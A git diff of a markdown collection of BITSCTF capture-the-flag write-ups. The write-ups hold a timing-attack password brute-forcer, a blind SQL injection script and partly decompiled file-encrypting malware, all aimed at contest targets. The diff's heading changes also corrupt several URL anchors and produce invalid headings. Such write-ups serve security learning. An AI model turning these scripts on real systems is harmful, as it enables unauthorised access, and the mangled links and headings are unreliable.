@@ -1,12 +1,12 @@
-# BITSCTF Writeups
+### BITSCTF Writeups
 
-### - [Cryptography Challenges](/docs/Cryptography/crypto.md)
+# - [Cryptography Challenges](/docs/Cryptography/crypto.md)
 
-# Baby RSA
-## Description
+######### Baby RSA
+###### Description
 RSA is for babies. So we improved it by taking it to the next dimension.
 
-## Solution
+###### Solution
 Putting `n` in dcode.fr gives `p` and `q`:
 ```
 p = 142753777417406810805072041989903711850167885799807517849278708651169396646976000865163313860950535511049508198208303464027395072922054180911222963584032655378369512823722235617080276310818723368812500206379762931650041566049091705857347865200497666530004056146401044724048482323535857808462375833056005919409
@@ -20,7 +20,7 @@ https://www.researchtrend.net/ijet/pdf/13%20%20Matrix%20Modification%20of%20RSA%
 phi = (p**2 -1)*(q**2 - 1)
 d = pow(e, -1, phi)
 
-#ct contains the given ciphertext output
+###ct contains the given ciphertext output
 c = matrix(Zmod(n), [[ct[0], ct[1]], [ct[2], ct[3]]])
 pt = c ^ d
 
@@ -30,7 +30,7 @@ for row in pt:
         flag += long_to_bytes(int(ele))
 print(flag)
 ```
-## Flag
+######### Flag
 `BITSCTF{63N3r41_11N34r_6r0UP_C4ND0_4NY7H1N6}`
 
 
@@ -38,12 +38,12 @@ print(flag)
 
 
 
-# Not Suspicious Agency
+### Not Suspicious Agency
 
-## Description
+###### Description
 The Not Suspicous Agency has created a very secure way to encrypt your messages that only trusted individuals can decrypt. Trust is very important after all.
 
-## Solution
+###### Solution
 Reference for Dual_EC_DRBG:
 https://www.youtube.com/watch?v=nybVFJVXbww <br><br>
 `P` and `Q` are  nistp256 points. `e` referenced in the video is what we have in `backdoor.txt`. We can check that `Q = eP`. So, we recover `rQ` by bruteforce, and multiply it by inverse of `e` to get the state `s`. <br><br>
@@ -93,20 +93,20 @@ if not flag:
     print("not found")
 ```
 
-## Flag
+###### Flag
 `BITSCTF{N3V3r_811ND1Y_7rU57_574ND4rD5}`
 
 
 
-### - [DFIR Challenges](/docs/dfir/dfir.md)
+# - [DFIR Challenges](/docs/dfir/dfir.md)
 
-# DFIR
+### DFIR
 
 DFIR or Digital Forensics and Incident Response is a field within cybersecurity that focuses on the identification, investigation, and remediation of cyberattacks. 
 
 We are provided with three files - memdump.mem, trace.pcap and artifacts.ad1
 
-## Access Granted! 
+###### Access Granted! 
 <i>Description: First things first. MogamBro is so dumb that he might be using the same set of passwords everywhere, so lets try cracking his PC's password for some luck.</i>
 <hr>
 Given that Mogambro reuses his password for many things, we can just find his user password. This can be achieved by dumping user hashes from memdump
@@ -129,11 +129,11 @@ This hash is easily cracked...
 
 ![Alt text](image-2.png)
 
-#### Flag: BITSCTF{adolfhitlerrulesallthepeople} 
+### Flag: BITSCTF{adolfhitlerrulesallthepeople} 
 <hr>
 <hr>
 
-## 0.69 Day 
+###### 0.69 Day 
 <i>Description: MogamBro was using some really old piece of software for his daily tasks. What a noob! Doesn't he know that using these deprecated versions of the same leaves him vulnerable towards various attacks! Sure he faced the consequences through those spam mails.
 
 Can you figure out the CVE of the exploit that the attacker used to gain access to MogamBro's machine & play around with his stuff.</i>
@@ -163,11 +163,11 @@ Googling a bit, we come across ```CVE-2023-38831``` that closely resembles this.
 
 ![Alt text](image-3.png)
 
-#### Flag: BITSCTF{CVE-2023-38831}
+### Flag: BITSCTF{CVE-2023-38831}
 <hr>
 <hr>
 
-## MogamBro's guilty pleasure
+###### MogamBro's guilty pleasure
 
 <i>Description: MogamBro was spammed with a lot of emails, he was able to evade some but fell for some of them due to his greed. Can you analyze the emails & figure out how he got scammed, not once but twice!</i>
 <hr>
@@ -180,10 +180,10 @@ On first glance they just look like any other spam mails..
 ![Alt text](image-4.png)
 ![Alt text](image-5.png)
 
-#### Flag: BITSCTF{sp4m_2_ph1sh_U} 
+### Flag: BITSCTF{sp4m_2_ph1sh_U} 
 <hr>
 
-## I'm wired in
+###### I'm wired in
 
 <i>Description: MogamBro got scared after knowing that his PC has been hacked and tried to type a SOS message to his friend through his 'keyboard'. Can you find the contents of that message, obviously the attacker was logging him!</i>
 <hr>
@@ -198,7 +198,7 @@ There's simply a keylog.pcap at ```C:/Mogambro/Desktop``` having usb traffic...
 True enough, HID data seems to have keylog information..
 ![Alt text](image-6.png)
 
-Using [this](https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf#page=53) table, we can decode the HID Data...  I like to do it manually, after applying filters.. but obviously scripts can be used...
+Using [this](https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf###page=53) table, we can decode the HID Data...  I like to do it manually, after applying filters.. but obviously scripts can be used...
 
 Decoded data...
 ```
@@ -211,12 +211,12 @@ BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}
 
 Always fun.
 
-#### Flag: BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}
+### Flag: BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}
 
 <hr>
 <hr>
 
-##  Bypassing Transport Layer 
+######  Bypassing Transport Layer 
 
 <i>Description: The exploit not only manipulated MogamBro's secret but also tried to establish an external TCP connection to gain further access to the machine. But I don't really think he was able to do so. Can you figure out where the exploit was trying to reach to?</i>
 <hr>
@@ -233,12 +233,12 @@ We can see pastebin link ```https://pastebin.com/mPvzn0AD``` that we found earli
 Following the TCP stream though, after a little search, we find the flag..
 
 ![Alt text](4.jpeg)
-#### Flag: BITSCTF{Ste4l1ng_pr1v47e_key5_ez:)}
+### Flag: BITSCTF{Ste4l1ng_pr1v47e_key5_ez:)}
 
 <hr>
 <hr>
 
-# Lottery
+### Lottery
 
 <i>Description: Now that you know the CVE, figure out how the attacker crafted the payload & executed it to compromise the 'secret'.</i><hr>
 We must get secret.png. We have come across lottery already in C:/Mogambro/Downloads.
@@ -282,8 +282,8 @@ Now we can use `pycdc` to get the .pyc file as it's original .py code
 
 ```
 └─$ pycdc lottery.pyc
-# Source Generated with Decompyle++
-# File: lottery.pyc (Python 3.8)
+### Source Generated with Decompyle++
+### File: lottery.pyc (Python 3.8)
 
 import os
 import tempfile
@@ -300,7 +300,7 @@ def generate_key():
 def encrypt_file(file_path, key):
 Unsupported opcode: BEGIN_FINALLY
     iv = b'urfuckedmogambro'
-# WARNING: Decompyle incomplete
+### WARNING: Decompyle incomplete
 
 if __name__ == '__main__':
     key = generate_key()
@@ -382,11 +382,11 @@ def save_decrypted_png(decrypted_data, output_path):
         decrypted_file.write(decrypted_data)
 
 def main():
-    # Provide the file path, AES key, and IV
+    ### Provide the file path, AES key, and IV
     encrypted_file_path = 'path/to/encrypted_file.png'
     output_file_path = 'path/to/decrypted_file.png'
-    aes_key = b'your_aes_key_here'  # 16, 24, or 32 bytes depending on AES key size (128, 192, or 256 bits)
-    iv = b'your_iv_here'  # 16 bytes
+    aes_key = b'your_aes_key_here'  ### 16, 24, or 32 bytes depending on AES key size (128, 192, or 256 bits)
+    iv = b'your_iv_here'  ### 16 bytes
 
     decrypted_data = decrypt_aes_cbc(encrypted_file_path, aes_key, iv)
     save_decrypted_png(decrypted_data, output_file_path)
@@ -404,7 +404,7 @@ we get the initial image
 Flag: `BITSCTF{1_r3c3ived_7h3_b0mbz}`
 
 
-### - [Forensics Challenges](/docs/forensics/forensics.md)
+# - [Forensics Challenges](/docs/forensics/forensics.md)
 
 ### CHALLENGE:
 rskbansal hacked into nasa mainframe and intercepted a radio signal from deep space along with a very SUS image. 
@@ -429,7 +429,7 @@ On using the enc.png file and enc_data.pkl along with the decode option in the h
 
 **FLAG: bitsctf{s73g4n06r4phy_15_n07_45_345y_45_17_533m5}**
 
-### - [Osint Challenges](/docs/osint/osint.md)
+# - [Osint Challenges](/docs/osint/osint.md)
 
 ### CHALLENGE:</br>
 Sir-Steals-A-Lot is a world famous art thief. Lately he stole this painting. When he was caught he claimed to have done it because the painting commemorates the location of the crowned glory of his lady love. They fell in love in her hometown but her grandfather wouldn't let her marry a thief like him.! 
@@ -453,9 +453,9 @@ It looks like we got the LadyLove's name. But the  flag requires the meaning of 
 **FLAG : BITSCTF{Queen}**
 
 
-### - [PWN Challenges](/docs/pwn/pwn.md)
+# - [PWN Challenges](/docs/pwn/pwn.md)
 
-# Mogambro's uncertainity principle
+### Mogambro's uncertainity principle
 
 Challenge description gives as follow
 
@@ -497,7 +497,7 @@ import ctypes
 
 context.log_level = "ERROR"
 
-# alphabets = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_"
+### alphabets = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_"
 alphabets = "abcdefghijklmnopqrstuvwxyz"
 
 
@@ -505,7 +505,7 @@ def runner(passwords, timeTakens, curPass, currentChar):
     r = remote("20.244.33.146", 4445)
 
     for p in passwords:
-        # print(p)
+        ### print(p)
         r.sendlineafter(b"Enter password: ", p)
 
     to_send = curPass.value + currentChar.encode()
@@ -517,11 +517,11 @@ def runner(passwords, timeTakens, curPass, currentChar):
         return
 
     output = r.recvline().decode()
-    # print(output)
+    ### print(output)
     if "congrat" in output.lower():
         if "BITSCTF" in output:
             print("\n\nGOT FLAG:", output.lower())
-            # exit() # exit () doesn't work if inside process
+            ### exit() ### exit () doesn't work if inside process
 
         print("\n\nCRACKED LEVEL", to_send)
         passwords.append(to_send)
@@ -530,7 +530,7 @@ def runner(passwords, timeTakens, curPass, currentChar):
         return
 
     p = r.recvline().decode().strip()
-    # print(to_send, p)
+    ### print(to_send, p)
     timeTakens[currentChar] = float(p.split("Time taken: ")[-1])
 
     r.close()
@@ -544,7 +544,7 @@ passwords_init = [
 ]
 
 curPass_init = "boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartp"
-# curPass_init = ""
+### curPass_init = ""
 
 manager = Manager()
 passwords = manager.list()
@@ -569,14 +569,14 @@ while True:
     for proc in procs:
         proc.join()
 
-    # print(timeTakens)
+    ### print(timeTakens)
 
     if len(passwords) == p_len:
         try:
             correct_letter = timeTakens.keys()[
                 timeTakens.values().index(max(timeTakens.values()))
             ]
-            # print(correct_letter)
+            ### print(correct_letter)
 
             curPass.value += correct_letter.encode()
         except ValueError:
@@ -588,24 +588,23 @@ while True:
 
     print(curPass.value)
 
-    # break
+    ### break
 ```
+# - [Rev Challenges](/docs/rev/rev.md)
 
-### - [Rev Challenges](/docs/rev/rev.md)
-
-# baby-rev
+### baby-rev
 
 Category: rev
 
 Solves: 468
 
-### Description
+######### Description
 
 > anita max wyinn
 
 ***
 
-### Solution
+######### Solution
 
 We are provided with a file, `baby-rev`.\
 Opened the given file in ghidra.\
@@ -617,12 +616,12 @@ assembled the flag manually from there to solve.
 
 ***
 
-### Flag  - `BITSCTF{w3lc0me_t0_r3v}`
+######### Flag  - `BITSCTF{w3lc0me_t0_r3v}`
 
 ***
 
 
-# Maxxing
+### Maxxing
 
 Open the given minimax binary in a decompiler. From there in main you can see the specific function being called for the win
 
@@ -657,29 +656,28 @@ print(long_to_bytes(a * b * c))
 `b'BITSCTF{w3_n33d_t0_st4rT_l0ok5m4Xx1nG}'`
 
 
-# Touch Grass
+### Touch Grass
 The question provides an apk that counts the number of steps using accelerometer. This has a couple of solutions. 
-## Solution 1:
+###### Solution 1:
 You can just walk.
-## Solution 2:
+###### Solution 2:
 You can shake the phone. This changes the acceleration constantly and it is counted as steps.
 
 
-
-### - [Web Challenges](/docs/web/web.md)
-# Conquest
+# - [Web Challenges](/docs/web/web.md)
+### Conquest
 
 Category: Web
 
 Solves: 62
 
-### Given information
+######### Given information
 
 > Our Mogambro is a lucid dreamer who has meticulously replicated one of his sessions in the form of the given website. Can you also complete the quest which Mogambro failed to do?
 
 > http://20.244.82.82:2913/
 
-### Solution
+######### Solution
 
 The website presents a puzzle:
 
@@ -721,7 +719,7 @@ Eventually we reach `/tournament/humans.txt`. This page presents an HTML form wi
 
 ---
 
-`1582510775.828625` is actually an [UNIX timestamp](https://en.wikipedia.org/wiki/Unix_time#Definition) that refers to `Mon Feb 24 07:49:35 AM IST 2020`, almost four years in the past.
+`1582510775.828625` is actually an [UNIX timestamp](https://en.wikipedia.org/wiki/Unix_time###Definition) that refers to `Mon Feb 24 07:49:35 AM IST 2020`, almost four years in the past.
 
 After providing various inputs to the `slay` form input such as:
 
@@ -733,19 +731,19 @@ We are able to obtain the flag on sending an absurdly large number: `1e308`.
 Flag: `BITSCTF{7HE_r341_7r345Ur3_W45_7H3_Fr13ND5_W3_M4D3_410N6_7H3_W4Y}`
 
 
-# Too Blind To See
+### Too Blind To See
 
 Category: Web
 
 Solves: 17
 
-### Given information
+######### Given information
 
 > Mogambro, our rookie intern, just stepped foot into the prestigious Software Firm. His big moment, the first project review, is knocking at the door like a pesky neighbor. But wait! Somewhere in his app lurks a secret which the admins are not aware of, hidden behind the password 'fluffybutterfly'. Can you crack the code and rescue Mogambro from this password puzzle? The clock is ticking!
 
 > http://20.244.82.82:7000/
 
-### Solution
+######### Solution
 
 The given link leads to a boilerplate shopping site which has three forms:
 
@@ -805,7 +803,7 @@ while True:
             print("Table name:", table_name)
             break
         else:
-            # print(c, r["exists"], end=" ")
+            ### print(c, r["exists"], end=" ")
             print(".", end="", flush=True)
 ```
 
@@ -839,15 +837,15 @@ We are then able to obtain the flag after logging in with the first set of crede
 
 Flag: `BITSCTF{5UB5Cr183r5_4r3_M0r3_7HAN_JU5T_C0N5UM3r5}`
 
-### - [MISC Challenges](/docs/dfir/misc.md)
+# - [MISC Challenges](/docs/dfir/misc.md)
 
-## Sanity Check
+###### Sanity Check
 
 Flag found in the rules channel of the discord server
 
 
 
-# Binary Zoetrope
+### Binary Zoetrope
 
 Given 1540 text files, each file has 240 lines of which each line has 320 characters, in which each character is either a 1 or a 0. 
 
@@ -882,11 +880,11 @@ def compile_images_into_gif(folder_path, output_path='output.gif'):
     image_files = glob(os.path.join(folder_path, '*.txt'))
     images = [create_image(file_path) for file_path in image_files]
 
-    # Save the images as frames in a GIF
+    ### Save the images as frames in a GIF
     images[0].save(output_path, save_all=True, append_images=images[1:], duration=100, loop=0)
 
 if __name__ == "__main__":
-    folder_path = 'data'  # Replace with the actual path to your files
+    folder_path = 'data'  ### Replace with the actual path to your files
     compile_images_into_gif(folder_path)
 ```
 
@@ -900,11 +898,11 @@ the end result is like this
 
 
 
-# Combinatorial Conundrum
+### Combinatorial Conundrum
 
 Category: Misc
 Solves: 17
-### Given information:
+######### Given information:
 
 >MogamBro has guarded your flag behind a grand equation. The equation involves 26 mysterious integers each constrained by a set of peculiar bounds. You need to find the number of solutions for the sum. The flag is equal to the remainder when the number of solutions is divided by 69696969.
   Wrap the flag that you get in BITSCTF{}
@@ -950,7 +948,7 @@ There's also a challenge file given, the content:
 >The flag is equal to the remainder when the number of solutions is divided by 69696969.
 >Wrap the flag that you get in BITSCTF{}
 
-### Solution:
+######### Solution:
 
 Here we have to find the number of non-negative integer solution to the equation `x1 + x2 + ... x26 = 69696969`  with the constraints on each variable given.
 
@@ -961,13 +959,13 @@ Inclusion-Exclusion principle provides for a much more efficient way to tackle t
 
 The script used:
 ```
-# Correcting the usage of comb() function
+### Correcting the usage of comb() function
 from math import comb
 
-# Define the target sum
+### Define the target sum
 target_sum = 69696969
 
-# Define the bounds
+### Define the bounds
 bounds = [
     (2008, 67434882), (5828, 35387831), (2933, 30133881), (411, 63609725),
     (4223, 18566959), (1614, 25526751), (5679, 44298843), (6349, 26793895),
@@ -978,10 +976,10 @@ bounds = [
     (2708, 22309445), (1528, 40848052)
 ]
 
-# Define the number of bounds
+### Define the number of bounds
 num_bounds = len(bounds)
 
-# Define a function to calculate the sum of integers within bounds
+### Define a function to calculate the sum of integers within bounds
 def sum_within_bounds(k):
     total = 0
     for i in range(1 << num_bounds):
@@ -992,13 +990,13 @@ def sum_within_bounds(k):
                 current_sum += bounds[j][0]
             else:
                 current_sum += bounds[j][1]
-        # Check if the argument for comb() is non-negative
+        ### Check if the argument for comb() is non-negative
         if k - current_sum + num_bounds - 1 >= 0:
             total += sign * comb(k - current_sum + num_bounds - 1, num_bounds - 1)
     return total
 
-# Apply inclusion-exclusion principle
-result = abs(sum_within_bounds(target_sum)) # Taking absolute value to ensure non-negativity
+### Apply inclusion-exclusion principle
+result = abs(sum_within_bounds(target_sum)) ### Taking absolute value to ensure non-negativity
 
 print("Number of solutions:", result)
 print("flag:BITSCTF{"+str(result)+"}")
